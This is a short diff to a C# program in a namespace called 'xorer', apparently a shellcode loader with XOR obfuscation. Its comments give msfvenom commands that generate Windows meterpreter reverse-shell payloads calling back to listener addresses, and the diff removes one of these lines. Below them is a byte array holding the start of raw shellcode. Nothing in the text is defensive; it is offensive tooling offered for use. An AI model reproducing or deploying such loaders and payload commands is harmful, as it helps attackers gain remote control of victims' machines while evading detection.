@@ -12,8 +12,6 @@ namespace xorer
         {
             // generate a meterpreter payload:
             // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
-            // works best with:
-            // msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.184.129 LPORT=80 -f csharp
             byte[] buf = new byte[752] {
 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
 0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
